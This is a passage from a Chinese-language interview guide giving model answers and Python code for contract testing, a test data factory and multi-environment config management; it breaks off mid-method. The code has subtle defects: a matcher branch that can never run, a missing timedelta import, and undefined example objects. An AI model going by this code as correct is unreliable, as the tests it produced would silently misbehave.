### 19.2 契约测试

**Q34: 如何设计和实现微服务契约测试？**

**参考答案：**

首先，我会分析契约测试的需求：
- **契约定义**：定义服务提供者和消费者之间的契约
- **契约验证**：验证服务是否符合契约
- **契约演进**：支持契约版本管理
- **双向测试**：消费者驱动和提供者驱动测试

其次，我会设计契约测试框架：

```python
# framework/contract_testing.py
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
import json
import re
from abc import ABC, abstractmethod

class ContractType(Enum):
    """契约类型"""
    CONSUMER_DRIVEN = "consumer_driven"
    PROVIDER_DRIVEN = "provider_driven"

@dataclass
class Interaction:
    """交互"""
    description: str
    request: Dict
    response: Dict
    provider_states: List[str] = field(default_factory=list)

@dataclass
class Contract:
    """契约"""
    consumer: str
    provider: str
    version: str
    contract_type: ContractType
    interactions: List[Interaction] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)
    created_at: datetime = field(default_factory=datetime.now)

@dataclass
class ContractTestResult:
    """契约测试结果"""
    contract_id: str
    interaction_description: str
    passed: bool
    errors: List[str] = field(default_factory=list)
    duration: float = 0

class ContractBuilder:
    """契约构建器"""
    
    def __init__(self, consumer: str, provider: str):
        self.consumer = consumer
        self.provider = provider
        self.interactions: List[Interaction] = []
    
    def upon_receiving(self, description: str) -> 'InteractionBuilder':
        """定义交互"""
        return InteractionBuilder(self, description)
    
    def add_interaction(self, interaction: Interaction):
        """添加交互"""
        self.interactions.append(interaction)
    
    def build(self, version: str = "1.0.0") -> Contract:
        """构建契约"""
        return Contract(
            consumer=self.consumer,
            provider=self.provider,
            version=version,
            contract_type=ContractType.CONSUMER_DRIVEN,
            interactions=self.interactions
        )

class InteractionBuilder:
    """交互构建器"""
    
    def __init__(self, contract_builder: ContractBuilder, description: str):
        self.contract_builder = contract_builder
        self.description = description
        self.request: Dict = {}
        self.response: Dict = {}
        self.provider_states: List[str] = []
    
    def with_request(
        self,
        method: str,
        path: str,
        headers: Dict = None,
        query: Dict = None,
        body: Dict = None
    ) -> 'InteractionBuilder':
        """定义请求"""
        self.request = {
            'method': method,
            'path': path,
            'headers': headers or {},
            'query': query or {},
            'body': body or {}
        }
        return self
    
    def will_respond_with(
        self,
        status: int,
        headers: Dict = None,
        body: Dict = None
    ) -> 'InteractionBuilder':
        """定义响应"""
        self.response = {
            'status': status,
            'headers': headers or {},
            'body': body or {}
        }
        return self
    
    def given(self, state: str) -> 'InteractionBuilder':
        """定义提供者状态"""
        self.provider_states.append(state)
        return self
    
    def build(self) -> ContractBuilder:
        """构建交互"""
        self.contract_builder.add_interaction(Interaction(
            description=self.description,
            request=self.request,
            response=self.response,
            provider_states=self.provider_states
        ))
        return self.contract_builder

class ContractVerifier:
    """契约验证器"""
    
    def __init__(self):
        self.matchers: Dict[str, callable] = {
            'equality': self._match_equality,
            'regex': self._match_regex,
            'type': self._match_type,
            'min': self._match_min,
            'max': self._match_max,
            'contains': self._match_contains
        }
    
    def verify_interaction(
        self,
        interaction: Interaction,
        actual_request: Dict = None,
        actual_response: Dict = None
    ) -> Dict:
        """验证交互"""
        errors = []
        
        if actual_request:
            request_errors = self._verify_request(
                interaction.request,
                actual_request
            )
            errors.extend(request_errors)
        
        if actual_response:
            response_errors = self._verify_response(
                interaction.response,
                actual_response
            )
            errors.extend(response_errors)
        
        return {
            'passed': len(errors) == 0,
            'errors': errors
        }
    
    def _verify_request(
        self,
        expected: Dict,
        actual: Dict
    ) -> List[str]:
        """验证请求"""
        errors = []
        
        if expected.get('method') != actual.get('method'):
            errors.append(
                f"方法不匹配: 期望 {expected.get('method')}, "
                f"实际 {actual.get('method')}"
            )
        
        if not self._match_path(expected.get('path', ''), actual.get('path', '')):
            errors.append(
                f"路径不匹配: 期望 {expected.get('path')}, "
                f"实际 {actual.get('path')}"
            )
        
        header_errors = self._verify_headers(
            expected.get('headers', {}),
            actual.get('headers', {})
        )
        errors.extend(header_errors)
        
        if expected.get('body'):
            body_errors = self._verify_body(
                expected.get('body'),
                actual.get('body')
            )
            errors.extend(body_errors)
        
        return errors
    
    def _verify_response(
        self,
        expected: Dict,
        actual: Dict
    ) -> List[str]:
        """验证响应"""
        errors = []
        
        if expected.get('status') != actual.get('status'):
            errors.append(
                f"状态码不匹配: 期望 {expected.get('status')}, "
                f"实际 {actual.get('status')}"
            )
        
        header_errors = self._verify_headers(
            expected.get('headers', {}),
            actual.get('headers', {})
        )
        errors.extend(header_errors)
        
        if expected.get('body'):
            body_errors = self._verify_body(
                expected.get('body'),
                actual.get('body')
            )
            errors.extend(body_errors)
        
        return errors
    
    def _verify_headers(
        self,
        expected: Dict,
        actual: Dict
    ) -> List[str]:
        """验证请求头"""
        errors = []
        
        for key, value in expected.items():
            if key not in actual:
                errors.append(f"缺少请求头: {key}")
            elif actual[key] != value:
                errors.append(
                    f"请求头 {key} 不匹配: 期望 {value}, "
                    f"实际 {actual[key]}"
                )
        
        return errors
    
    def _verify_body(
        self,
        expected: Any,
        actual: Any,
        path: str = 'body'
    ) -> List[str]:
        """验证请求体"""
        errors = []
        
        if isinstance(expected, dict):
            if not isinstance(actual, dict):
                errors.append(f"{path} 应该是对象")
            else:
                for key, value in expected.items():
                    if key not in actual:
                        errors.append(f"{path}.{key} 缺少")
                    else:
                        child_errors = self._verify_body(
                            value,
                            actual[key],
                            f"{path}.{key}"
                        )
                        errors.extend(child_errors)
        
        elif isinstance(expected, list):
            if not isinstance(actual, list):
                errors.append(f"{path} 应该是数组")
        
        elif isinstance(expected, dict) and '$matcher' in expected:
            matcher_type = expected['$matcher']
            matcher_value = expected.get('value')
            matcher_result = self.matchers.get(matcher_type, lambda a, e: False)(
                actual, matcher_value
            )
            if not matcher_result:
                errors.append(f"{path} 匹配失败")
        
        elif expected != actual:
            errors.append(
                f"{path} 值不匹配: 期望 {expected}, 实际 {actual}"
            )
        
        return errors
    
    def _match_path(self, expected: str, actual: str) -> bool:
        """匹配路径"""
        expected_parts = expected.split('/')
        actual_parts = actual.split('/')
        
        if len(expected_parts) != len(actual_parts):
            return False
        
        for exp, act in zip(expected_parts, actual_parts):
            if exp.startswith('{') and exp.endswith('}'):
                continue
            if exp != act:
                return False
        
        return True
    
    def _match_equality(self, actual: Any, expected: Any) -> bool:
        """相等匹配"""
        return actual == expected
    
    def _match_regex(self, actual: Any, pattern: str) -> bool:
        """正则匹配"""
        return bool(re.match(pattern, str(actual)))
    
    def _match_type(self, actual: Any, expected_type: str) -> bool:
        """类型匹配"""
        type_map = {
            'string': str,
            'number': (int, float),
            'boolean': bool,
            'array': list,
            'object': dict
        }
        return isinstance(actual, type_map.get(expected_type, object))
    
    def _match_min(self, actual: Any, min_value: int) -> bool:
        """最小值匹配"""
        if isinstance(actual, (int, float)):
            return actual >= min_value
        elif isinstance(actual, (str, list)):
            return len(actual) >= min_value
        return False
    
    def _match_max(self, actual: Any, max_value: int) -> bool:
        """最大值匹配"""
        if isinstance(actual, (int, float)):
            return actual <= max_value
        elif isinstance(actual, (str, list)):
            return len(actual) <= max_value
        return False
    
    def _match_contains(self, actual: Any, expected: Any) -> bool:
        """包含匹配"""
        if isinstance(actual, (str, list)):
            return expected in actual
        elif isinstance(actual, dict):
            return expected in actual.keys()
        return False

class ContractTestRunner:
    """契约测试运行器"""
    
    def __init__(self):
        self.verifier = ContractVerifier()
        self.contracts: Dict[str, Contract] = {}
        self.results: List[ContractTestResult] = []
    
    def register_contract(self, contract: Contract):
        """注册契约"""
        key = f"{contract.consumer}-{contract.provider}-{contract.version}"
        self.contracts[key] = contract
    
    def run_consumer_test(
        self,
        contract_key: str,
        mock_server: Any
    ) -> List[ContractTestResult]:
        """运行消费者测试"""
        contract = self.contracts.get(contract_key)
        if not contract:
            return []
        
        results = []
        
        for interaction in contract.interactions:
            start_time = datetime.now()
            
            actual_response = mock_server.handle_request(
                interaction.request['method'],
                interaction.request['path'],
                interaction.request.get('body')
            )
            
            verification = self.verifier.verify_interaction(
                interaction,
                actual_response=actual_response
            )
            
            duration = (datetime.now() - start_time).total_seconds()
            
            result = ContractTestResult(
                contract_id=contract_key,
                interaction_description=interaction.description,
                passed=verification['passed'],
                errors=verification['errors'],
                duration=duration
            )
            
            results.append(result)
            self.results.append(result)
        
        return results
    
    def run_provider_test(
        self,
        contract_key: str,
        provider_client: Any
    ) -> List[ContractTestResult]:
        """运行提供者测试"""
        contract = self.contracts.get(contract_key)
        if not contract:
            return []
        
        results = []
        
        for interaction in contract.interactions:
            start_time = datetime.now()
            errors = []
            
            try:
                for state in interaction.provider_states:
                    provider_client.setup_state(state)
                
                actual_response = provider_client.make_request(
                    interaction.request['method'],
                    interaction.request['path'],
                    interaction.request.get('headers'),
                    interaction.request.get('body')
                )
                
                verification = self.verifier.verify_interaction(
                    interaction,
                    actual_response=actual_response
                )
                errors.extend(verification['errors'])
                
            except Exception as e:
                errors.append(f"执行错误: {str(e)}")
            
            duration = (datetime.now() - start_time).total_seconds()
            
            result = ContractTestResult(
                contract_id=contract_key,
                interaction_description=interaction.description,
                passed=len(errors) == 0,
                errors=errors,
                duration=duration
            )
            
            results.append(result)
            self.results.append(result)
        
        return results
    
    def get_summary(self) -> Dict:
        """获取测试摘要"""
        total = len(self.results)
        passed = sum(1 for r in self.results if r.passed)
        
        return {
            'total': total,
            'passed': passed,
            'failed': total - passed,
            'pass_rate': passed / total * 100 if total > 0 else 0
        }

class ContractBroker:
    """契约代理"""
    
    def __init__(self):
        self.contracts: Dict[str, Dict[str, Contract]] = {}
    
    def publish_contract(self, contract: Contract):
        """发布契约"""
        provider = contract.provider
        consumer = contract.consumer
        
        if provider not in self.contracts:
            self.contracts[provider] = {}
        
        self.contracts[provider][consumer] = contract
    
    def get_consumer_contracts(self, consumer: str) -> List[Contract]:
        """获取消费者契约"""
        contracts = []
        
        for provider, consumers in self.contracts.items():
            if consumer in consumers:
                contracts.append(consumers[consumer])
        
        return contracts
    
    def get_provider_contracts(self, provider: str) -> List[Contract]:
        """获取提供者契约"""
        if provider not in self.contracts:
            return []
        
        return list(self.contracts[provider].values())
    
    def check_compatibility(
        self,
        old_contract: Contract,
        new_contract: Contract
    ) -> Dict:
        """检查兼容性"""
        errors = []
        warnings = []
        
        old_endpoints = {
            (i.request['method'], i.request['path'])
            for i in old_contract.interactions
        }
        
        new_endpoints = {
            (i.request['method'], i.request['path'])
            for i in new_contract.interactions
        }
        
        removed = old_endpoints - new_endpoints
        if removed:
            errors.append(f"删除的端点: {removed}")
        
        added = new_endpoints - old_endpoints
        if added:
            warnings.append(f"新增的端点: {added}")
        
        for old_interaction in old_contract.interactions:
            for new_interaction in new_contract.interactions:
                if (old_interaction.request['method'] == new_interaction.request['method'] and
                    old_interaction.request['path'] == new_interaction.request['path']):
                    
                    if old_interaction.response.get('status') != new_interaction.response.get('status'):
                        errors.append(
                            f"状态码变更: {old_interaction.request['path']} "
                            f"从 {old_interaction.response.get('status')} "
                            f"变为 {new_interaction.response.get('status')}"
                        )
        
        return {
            'compatible': len(errors) == 0,
            'errors': errors,
            'warnings': warnings
        }

# 使用示例
# 构建契约
contract = (
    ContractBuilder('order-service', 'user-service')
    .upon_receiving('获取用户信息')
    .given('用户存在')
    .with_request(
        method='GET',
        path='/api/users/1',
        headers={'Authorization': 'Bearer token'}
    )
    .will_respond_with(
        status=200,
        headers={'Content-Type': 'application/json'},
        body={
            'id': 1,
            'username': 'testuser',
            'email': {'$matcher': 'regex', 'value': r'.*@.*\..*'}
        }
    )
    .upon_receiving('创建用户')
    .given('用户不存在')
    .with_request(
        method='POST',
        path='/api/users/',
        headers={'Content-Type': 'application/json'},
        body={
            'username': 'newuser',
            'email': 'new@example.com'
        }
    )
    .will_respond_with(
        status=201,
        body={
            'id': {'$matcher': 'type', 'value': 'number'},
            'username': 'newuser'
        }
    )
    .build()
)

# 发布契约
broker = ContractBroker()
broker.publish_contract(contract)

# 运行契约测试
runner = ContractTestRunner()
runner.register_contract(contract)

# 消费者测试
consumer_results = runner.run_consumer_test(
    f"{contract.consumer}-{contract.provider}-{contract.version}",
    mock_server
)

# 提供者测试
provider_results = runner.run_provider_test(
    f"{contract.consumer}-{contract.provider}-{contract.version}",
    provider_client
)

# 获取摘要
summary = runner.get_summary()
print(f"测试摘要: {summary}")
```

## 二十、测试数据管理进阶

### 20.1 测试数据工厂

**Q35: 如何设计一个测试数据工厂？**

**参考答案：**

首先，我会分析测试数据工厂的需求：
- **数据生成**：支持多种数据类型生成
- **数据关联**：支持关联数据生成
- **数据持久化**：支持数据保存和恢复
- **数据清理**：支持测试后数据清理

其次，我会设计测试数据工厂：

```python
# framework/data_factory.py
from typing import Dict, List, Optional, Any, Callable, Type
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
import random
import string
import uuid
import json
from abc import ABC, abstractmethod

class DataType(Enum):
    """数据类型"""
    USER = "user"
    PROJECT = "project"
    TESTCASE = "testcase"
    ORDER = "order"
    PRODUCT = "product"

@dataclass
class DataTemplate:
    """数据模板"""
    name: str
    fields: Dict[str, Any]
    relations: Dict[str, str] = field(default_factory=dict)
    defaults: Dict[str, Any] = field(default_factory=dict)

@dataclass
class GeneratedData:
    """生成的数据"""
    id: str
    data_type: DataType
    data: Dict
    created_at: datetime = field(default_factory=datetime.now)
    dependencies: List[str] = field(default_factory=list)

class FieldGenerator(ABC):
    """字段生成器基类"""
    
    @abstractmethod
    def generate(self, **kwargs) -> Any:
        """生成数据"""
        pass

class StringGenerator(FieldGenerator):
    """字符串生成器"""
    
    def __init__(
        self,
        prefix: str = "",
        length: int = 8,
        charset: str = None
    ):
        self.prefix = prefix
        self.length = length
        self.charset = charset or string.ascii_letters + string.digits
    
    def generate(self, **kwargs) -> str:
        value = ''.join(random.choices(self.charset, k=self.length))
        return f"{self.prefix}{value}"

class IntegerGenerator(FieldGenerator):
    """整数生成器"""
    
    def __init__(self, min_val: int = 1, max_val: int = 100):
        self.min_val = min_val
        self.max_val = max_val
    
    def generate(self, **kwargs) -> int:
        return random.randint(self.min_val, self.max_val)

class FloatGenerator(FieldGenerator):
    """浮点数生成器"""
    
    def __init__(
        self,
        min_val: float = 0.0,
        max_val: float = 100.0,
        decimals: int = 2
    ):
        self.min_val = min_val
        self.max_val = max_val
        self.decimals = decimals
    
    def generate(self, **kwargs) -> float:
        value = random.uniform(self.min_val, self.max_val)
        return round(value, self.decimals)

class EmailGenerator(FieldGenerator):
    """邮箱生成器"""
    
    def __init__(self, domains: List[str] = None):
        self.domains = domains or ['gmail.com', 'outlook.com', 'qq.com']
    
    def generate(self, **kwargs) -> str:
        username = ''.join(random.choices(string.ascii_lowercase, k=8))
        domain = random.choice(self.domains)
        return f"{username}@{domain}"

class PhoneGenerator(FieldGenerator):
    """手机号生成器"""
    
    def __init__(self, prefixes: List[str] = None):
        self.prefixes = prefixes or ['138', '139', '150', '151', '186']
    
    def generate(self, **kwargs) -> str:
        prefix = random.choice(self.prefixes)
        suffix = ''.join(random.choices(string.digits, k=8))
        return prefix + suffix

class DateGenerator(FieldGenerator):
    """日期生成器"""
    
    def __init__(
        self,
        start_date: str = "2020-01-01",
        end_date: str = None,
        format: str = "%Y-%m-%d"
    ):
        self.start_date = datetime.strptime(start_date, format)
        self.end_date = datetime.strptime(end_date, format) if end_date else datetime.now()
        self.format = format
    
    def generate(self, **kwargs) -> str:
        delta = self.end_date - self.start_date
        random_days = random.randint(0, delta.days)
        random_date = self.start_date + timedelta(days=random_days)
        return random_date.strftime(self.format)

class ChoiceGenerator(FieldGenerator):
    """选择生成器"""
    
    def __init__(self, choices: List[Any]):
        self.choices = choices
    
    def generate(self, **kwargs) -> Any:
        return random.choice(self.choices)

class SequenceGenerator(FieldGenerator):
    """序列生成器"""
    
    def __init__(self, prefix: str = "", start: int = 1):
        self.prefix = prefix
        self.current = start
    
    def generate(self, **kwargs) -> str:
        value = f"{self.prefix}{self.current}"
        self.current += 1
        return value

class FakerGenerator(FieldGenerator):
    """Faker生成器"""
    
    def __init__(self, method: str, locale: str = 'zh_CN'):
        self.method = method
        self.locale = locale
        self._faker = None
    
    @property
    def faker(self):
        if self._faker is None:
            from faker import Faker
            self._faker = Faker(self.locale)
        return self._faker
    
    def generate(self, **kwargs) -> Any:
        return getattr(self.faker, self.method)()

class DataFactory:
    """数据工厂"""
    
    def __init__(self):
        self.templates: Dict[str, DataTemplate] = {}
        self.generators: Dict[str, FieldGenerator] = {}
        self.generated_data: Dict[str, GeneratedData] = {}
        self._setup_default_generators()
    
    def _setup_default_generators(self):
        """设置默认生成器"""
        self.generators.update({
            'uuid': type('UUIDGenerator', (FieldGenerator,), {
                'generate': lambda self, **kw: str(uuid.uuid4())
            })(),
            'timestamp': type('TimestampGenerator', (FieldGenerator,), {
                'generate': lambda self, **kw: int(datetime.now().timestamp())
            })(),
            'now': type('NowGenerator', (FieldGenerator,), {
                'generate': lambda self, **kw: datetime.now().isoformat()
            })()
        })
    
    def register_template(self, template: DataTemplate):
        """注册模板"""
        self.templates[template.name] = template
    
    def register_generator(self, name: str, generator: FieldGenerator):
        """注册生成器"""
        self.generators[name] = generator
    
    def define(self, name: str, **fields) -> 'DataFactory':
        """定义数据模板"""
        template = DataTemplate(name=name, fields=fields)
        self.templates[name] = template
        return self
    
    def create(
        self,
        template_name: str,
        count: int = 1,
        overrides: Dict[str, Any] = None,
        save: bool = True
    ) -> List[Dict]:
        """创建数据"""
        template = self.templates.get(template_name)
        if not template:
            raise ValueError(f"模板 {template_name} 不存在")
        
        results = []
        
        for _ in range(count):
            data = {}
            
            for field_name, field_def in template.fields.items():
                if overrides and field_name in overrides:
                    data[field_name] = overrides[field_name]
                elif field_name in template.defaults:
                    data[field_name] = template.defaults[field_name]
                else:
                    data[field_name] = self._generate_field(field_def)
            
            for field_name, default_value in template.defaults.items():
                if field_name not in data:
                    data[field_name] = default_value
            
            if save:
                generated = GeneratedData(
                    id=str(uuid.uuid4()),
                    data_type=DataType(template_name),
                    data=data
                )
                self.generated_data[generated.id] = generated
                data['_id'] = generated.id
            
            results.append(data)
        
        return results
    
    def _generate_field(self, field_def: Any) -> Any:
        """生成字段值"""
        if isinstance(field_def, FieldGenerator):
            return field_def.generate()
        
        elif isinstance(field_def, str):
            if field_def.startswith('$'):
                generator_name = field_def[1:]
                if generator_name in self.generators:
                    return self.generators[generator_name].generate()
            return field_def
        
        elif isinstance(field_def, dict):
            if 'generator' in field_def:
                generator_name = field_def['generator']
                params = {k: v for k, v in field_def.items() if k != 'generator'}
                
                if generator_name in self.generators:
                    generator = self.generators[generator_name]
                    return generator.generate(**params)
            
            return {k: self._generate_field(v) for k, v in field_def.items()}
        
        elif isinstance(field_def, list):
            return [self._generate_field(item) for item in field_def]
        
        elif callable(field_def):
            return field_def()
        
        return field_def
    
    def create_related(
        self,
        template_name: str,
        relations: Dict[str, str],
        count: int = 1
    ) -> List[Dict]:
        """创建关联数据"""
        template = self.templates.get(template_name)
        if not template:
            raise ValueError(f"模板 {template_name} 不存在")
        
        results = []
        
        for _ in range(count):
            data = {}
            
            for field_name, field_def in template.fields.items():
                if field_name in relations:
                    related_template = relations[field_name]
                    related_data = self.create(related_template, count=1)[0]
                    data[field_name] = related_data
                else:
                    data[field_name] = self._generate_field(field_def)
            
            results.append(data)
        
        return results
    
    def cleanup(self, data_ids: List[str] = None):
        """清理数据"""
        if data_ids:
            for data_id in data_ids:
                if data_id in self.generated_data:
                    del self.generated_data[data_id]
        else:
            self.generated_data.clear()
    
    def get_statistics(self) -> Dict:
        """获取统计信息"""
        type_counts = {}
        for data in self.generated_data.values():
            type_name = data.data_type.value
            type_counts[type_name] = type_counts.get(type_name, 0) + 1
        
        return {
            'total_count': len(self.generated_data),
            'by_type': type_counts
        }

class DataPersister:
    """数据持久化器"""
    
    def __init__(self, db_connection: Any = None):
        self.db_connection = db_connection
        self.snapshots: Dict[str, Dict] = {}
    
    def save_snapshot(self, name: str, data: Dict):
        """保存快照"""
        self.snapshots[name] = {
            'data': json.dumps(data, default=str),
            'created_at': datetime.now().isoformat()
        }
    
    def load_snapshot(self, name: str) -> Optional[Dict]:
        """加载快照"""
        snapshot = self.snapshots.get(name)
        if snapshot:
            return json.loads(snapshot['data'])
        return None
    
    def delete_snapshot(self, name: str):
        """删除快照"""
        if name in self.snapshots:
            del self.snapshots[name]
    
    def export_to_file(self, filepath: str, data: Dict):
        """导出到文件"""
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2, default=str)
    
    def import_from_file(self, filepath: str) -> Dict:
        """从文件导入"""
        with open(filepath, 'r', encoding='utf-8') as f:
            return json.load(f)

class DataBuilder:
    """数据构建器"""
    
    def __init__(self, factory: DataFactory):
        self.factory = factory
        self._data: Dict = {}
        self._template_name: Optional[str] = None
    
    def from_template(self, template_name: str) -> 'DataBuilder':
        """从模板创建"""
        self._template_name = template_name
        return self
    
    def with_field(self, name: str, value: Any) -> 'DataBuilder':
        """设置字段"""
        self._data[name] = value
        return self
    
    def with_fields(self, fields: Dict) -> 'DataBuilder':
        """设置多个字段"""
        self._data.update(fields)
        return self
    
    def build(self) -> Dict:
        """构建数据"""
        if self._template_name:
            return self.factory.create(
                self._template_name,
                count=1,
                overrides=self._data
            )[0]
        return self._data.copy()
    
    def build_many(self, count: int) -> List[Dict]:
        """构建多条数据"""
        if self._template_name:
            return self.factory.create(
                self._template_name,
                count=count,
                overrides=self._data
            )
        return [self._data.copy() for _ in range(count)]

# 使用示例
factory = DataFactory()

# 定义数据模板
factory.define('user',
    id='$uuid',
    username=StringGenerator(prefix='user_', length=8),
    email=EmailGenerator(),
    phone=PhoneGenerator(),
    age=IntegerGenerator(min_val=18, max_val=60),
    status=ChoiceGenerator(['active', 'inactive', 'pending']),
    created_at='$now'
)

factory.define('project',
    id='$uuid',
    name=StringGenerator(prefix='项目_', length=6),
    description=FakerGenerator('text'),
    owner_id='$uuid',
    status=ChoiceGenerator(['active', 'archived']),
    created_at='$now'
)

factory.define('testcase',
    id='$uuid',
    title=FakerGenerator('sentence'),
    priority=ChoiceGenerator(['P0', 'P1', 'P2', 'P3']),
    status=ChoiceGenerator(['draft', 'review', 'approved']),
    created_by='$uuid',
    created_at='$now'
)

# 创建数据
users = factory.create('user', count=5)
for user in users:
    print(f"用户: {user['username']}, 邮箱: {user['email']}")

# 使用构建器
user = (
    DataBuilder(factory)
    .from_template('user')
    .with_field('username', 'custom_user')
    .with_field('status', 'active')
    .build()
)
print(f"自定义用户: {user}")

# 创建关联数据
projects = factory.create_related(
    'project',
    relations={'owner_id': 'user'},
    count=3
)

# 数据持久化
persister = DataPersister()
persister.save_snapshot('test_data', {'users': users, 'projects': projects})

# 获取统计
stats = factory.get_statistics()
print(f"数据统计: {stats}")
```

## 二十一、测试配置管理

### 20.2 多环境配置管理

**Q36: 如何设计多环境测试配置管理方案？**

**参考答案：**

首先，我会分析多环境配置管理的需求：
- **环境隔离**：不同环境的配置独立管理
- **配置继承**：支持配置继承和覆盖
- **敏感信息**：安全存储敏感配置
- **动态更新**：支持配置动态更新

其次，我会设计多环境配置管理方案：

```python
# framework/config_management.py
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
import json
import yaml
import os
from pathlib import Path
import base64
import hashlib
from cryptography.fernet import Fernet

class Environment(Enum):
    """环境类型"""
    DEVELOPMENT = "development"
    TESTING = "testing"
    STAGING = "staging"
    PRODUCTION = "production"

@dataclass
class ConfigValue:
    """配置值"""
    key: str
    value: Any
    encrypted: bool = False
    description: str = ""
    updated_at: datetime = field(default_factory=datetime.now)

@dataclass
class EnvironmentConfig:
    """环境配置"""
    name: str
    env_type: Environment
    config: Dict[str, ConfigValue] = field(default_factory=dict)
    inherits_from: Optional[str] = None
    created_at: datetime = field(default_factory=datetime.now)

class ConfigEncryptor:
    """配置加密器"""
    
    def __init__(self, key: bytes = None):
        self.key = key or Fernet.generate_key()
        self.cipher = Fernet(self.key)
    
    def encrypt(self, value: str) -> str:
        """加密"""
        return self.cipher.encrypt(value.encode()).decode()
    
    def decrypt(self, encrypted_value: str) -> str:
        """解密"""
        return self.cipher.decrypt(encrypted_value.encode()).decode()
    
    def get_key(self) -> str:
        """获取密钥"""
        return base64.b64encode(self.key).decode()
    
    @classmethod
    def from_key(cls, key_str: str) -> 'ConfigEncryptor':
        """从密钥创建"""
        key = base64.b64decode(key_str.encode())
        return cls(key)

class ConfigLoader:
    """配置加载器"""
    
    @staticmethod
    def load_yaml(filepath: str) -> Dict:
        """加载YAML配置"""
        with open(filepath, 'r', encoding='utf-8') as f:
            return yaml.safe_load(f) or {}
    
    @staticmethod
    def load_json(filepath: str) -> Dict:
        """加载JSON配置"""
        with open(filepath, 'r', encoding='utf-8') as f:
            return json.load(f)
    
    @staticmethod
    def load_env(prefix: str = '') -> Dict:
        """加载环境变量"""
        config = {}
        for key, value in os.environ.items():
            if prefix and key.startswith(prefix):
                config_key = key[len(prefix):].lower()
                config[config_key] = value
            elif not prefix:
                config[key.lower()] = value
        return config
    
    @staticmethod
    def save_yaml(filepath: str, config: Dict):
        """保存YAML配置"""
        with open(filepath, 'w', encoding='utf-8') as f:
            yaml.dump(config, f, allow_unicode=True, default_flow_style=False)
    
    @staticmethod
    def save_json(filepath: str, config: Dict):
        """保存JSON配置"""
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(config, f, ensure_ascii=False, indent=2)

class ConfigValidator:
    """配置验证器"""
    
    def __init__(self):
        self.rules: Dict[str, Dict] = {}
    
    def add_rule(
        self,
        key: str,
        required: bool = True,
        value_type: type = None,
        allowed_values: List[Any] = None,
        pattern: str = None,
        min_value: Any = None,
        max_value: Any = None
    ):
        """添加验证规则"""
        self.rules[key] = {
            'required': required,
            'type': value_type,
            'allowed_values': allowed_values,
            'pattern': pattern,
            'min': min_value,
            'max': max_value
        }
    
    def validate(self, config: Dict) -> Dict:
        """验证配置"""
        errors = []
        warnings = []
        
        for key, rule in self.rules.items():
            if rule['required'] and key not in config:
                errors.append(f"缺少必填配置: {key}")
                continue
            
            if key not in config:
                continue
            
            value = config[key]
            
            if rule['type'] and not isinstance(value, rule['type']):
                errors.append(
                    f"配置 {key} 类型错误: 期望 {rule['type'].__name__}, "
                    f"实际 {type(value).__name__}"
                )
            
            if rule['allowed_values'] and value not in rule['allowed_values']:
                errors.append(
                    f"配置 {key} 值无效: {value}, "
                    f"允许值: {rule['allowed_values']}"
                )
            
            if rule['pattern']:
                import re
                if not re.match(rule['pattern'], str(value)):
                    errors.append(
                        f"配置 {key} 格式无效: {value}"
                    )
            
            if rule['min'] is not None:
                if isinstance(value, (int, float)) and value < rule['min']:
                    errors.append(
                        f"配置 {key} 值过小: {value}, 最小值: {rule['min']}"
                    )
            
            if rule['max'] is not None:
                if isinstance(value, (int, float)) and value > rule['max']:
                    errors.append(
                        f"配置 {key} 值过大: {value}, 最大值: {rule['max']}"
                    )
        
        for key in config:
            if key not in self.rules:
                warnings.append(f"未知配置项: {key}")
        
        return {
            'valid': len(errors) == 0,
            'errors': errors,
            'warnings': warnings
        }

class EnvironmentConfigManager:
    """环境配置管理器"""
    
    def __init__(self, config_dir: str = 'config'):
        self.config_dir = Path(config_dir)
        self.environments: Dict[str, EnvironmentConfig] = {}
        self.encryptor = ConfigEncryptor()
        self.validator = ConfigValidator()
        self._current_env: Optional[str] = None
    
    def create_environment(
        self,
        name: str,
        env_type: Environment,
        inherits_from: str = None
    ) -> EnvironmentConfig:
        """创建环境"""
        env = EnvironmentConfig(
            name=name,
            env_type=env_type,
            inherits_from=inherits_from
        )
        self.environments[name] = env
        return env
    
    def set_config(
        self,
        env_name: str,
        key: str,
        value: Any,
        encrypted: bool = False,
        description: str = ""
    ):
        """设置配置"""
        env = self.environments.get(env_name)
        if not env:
            raise ValueError(f"环境 {env_name} 不存在")
        
        if encrypted and isinstance(value, str):
            value = self.encryptor.encrypt(value)
        
        env.config[key] = ConfigValue(
            key=key,
            value=value,
            encrypted=encrypted,
            description=description
        )
    
    def get_config(
        self,
        env_name: str,
        key: str,
        default: Any = None
    ) -> Any:
        """获取配置"""
        env = self.environments.get(env_name)
        if not env:
            return default
        
        config_value = env.config.get(key)
        if config_value:
            if config_value.encrypted:
                return self.encryptor.decrypt(config_value.value)
            return config_value.value
        
        if env.inherits_from:
            return self.get_config(env.inherits_from, key, default)
        
        return default
    
    def get_all_config(self, env_name: str) -> Dict:
        """获取所有配置"""
        env = self.environments.get(env_name)
        if not env:
            return {}
        
        config = {}
        
        if env.inherits_from:
            config.update(self.get_all_config(env.inherits_from))
        
        for key, config_value in env.config.items():
            if config_value.encrypted:
                config[key] = self.encryptor.decrypt(config_value.value)
            else:
                config[key] = config_value.value
        
        return config
    
    def set_current_environment(self, env_name: str):
        """设置当前环境"""
        if env_name not in self.environments:
            raise ValueError(f"环境 {env_name} 不存在")
        self._current_env = env_name
    
    def get(self, key: str, default: Any = None) -> Any:
        """获取当前环境配置"""
        if not self._current_env:
            raise RuntimeError("未设置当前环境")
        return self.get_config(self._current_env, key, default)
    
    def load_from_file(self, env_name: str, filepath: str):
        """从文件加载配置"""
        config = ConfigLoader.load_yaml(filepath)
        
        for key, value in config.items():
            if isinstance(value, dict) and 'value' in value:
                self.set_config(
                    env_name,
                    key,
                    value['value'],
                    encrypted=value.get('encrypted', False),
                    description=value.get('description', '')
                )
            else:
                self.set_config(env_name, key, value)
    
    def save_to_file(self, env_name: str, filepath: str):
        """保存配置到文件"""
        env = self.environments.get(env_name)
        if not env:
            return
        
        config = {}
        for key, config_value in env.config.items():
            config[key] = {
                'value': config_value.value,
                'encrypted': config_value.encrypted,
                'description': config_value.description
            }
        
        ConfigLoader.save_yaml(filepath, config)
    
    def validate_environment(self, env_name: str) -> Dict:
